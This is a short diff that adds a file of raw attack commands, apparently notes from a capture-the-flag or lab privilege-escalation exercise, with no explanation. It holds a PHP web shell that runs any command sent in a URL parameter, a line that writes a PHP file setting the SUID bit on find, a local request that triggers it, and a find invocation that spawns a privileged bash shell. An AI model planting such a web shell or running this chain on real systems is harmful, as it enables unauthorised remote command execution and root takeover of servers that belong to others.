@@ -1,0 +1,7 @@
+<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>
+
+echo "<?php system('chmod +x /usr/bin/find; chmod +s /usr/bin/find');?>" > index.php
+
+curl localhost:57
+
+find . -exec /bin/bash -p \; -quit
